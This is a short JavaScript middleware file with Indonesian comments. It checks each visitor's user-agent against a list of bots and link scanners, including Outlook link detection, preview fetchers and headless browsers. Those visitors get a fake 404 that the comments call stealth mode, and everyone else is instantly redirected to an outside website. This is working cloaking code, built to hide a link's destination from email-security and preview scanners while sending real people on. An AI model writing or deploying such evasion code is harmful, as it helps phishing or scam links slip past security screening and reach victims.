export const config = {
  matcher: '/', 
};

export default function middleware(req) {
  const ua = req.headers.get('user-agent')?.toLowerCase() || '';

  // Daftar kata kunci Bot Scanner
  const botKeywords = [
    'bot', 'spider', 'crawler', 'scanner', 'outlook-linkdetect', 
    'preview', 'headless', 'googleusercontent', 'monit', 'slurp',
    'lighthouse', 'bingbot', 'adsbot'
  ];

  const isBot = botKeywords.some(keyword => ua.includes(keyword));

  // 1. Jika terdeteksi Bot, kasih 404 (Siluman Mode)
  if (isBot) {
    return new Response('404 Not Found', { status: 404 });
  }

  // 2. Jika Manusia, Redirect Instan
  const targetUrl = 'https://nusaindahrp.com/?dev';
  
  return Response.redirect(targetUrl, 307);
}
